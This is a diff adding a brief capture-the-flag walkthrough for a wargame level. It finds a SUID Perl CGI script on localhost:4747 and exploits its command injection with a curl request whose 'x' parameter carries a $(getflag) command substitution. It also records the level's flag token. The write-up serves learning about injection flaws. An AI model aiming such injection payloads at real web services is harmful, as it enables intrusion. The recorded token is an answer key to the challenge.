@@ -1,0 +1,18 @@
+1. List files in the directory:
+   ll
+   # Output shows: level04.pl with SUID permissions (rwsr-sr-x) owned by flag04
+
+2. Examine the Perl script:
+   cat level04.pl
+   # Shows a CGI script running on localhost:4747
+   # The script takes parameter "x" and executes it with echo command
+   # Vulnerable to command injection
+
+3. Exploit the command injection vulnerability:
+   curl 'http://localhost:4747?x=$(getflag)'
+   # Uses command substitution to execute getflag
+   # Output: Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+TECHNIQUE: Command injection via CGI parameter
+VULNERABILITY: Unsanitized input passed to shell command
+TOKEN: ne2searoevaevoem4ov4ar8ap
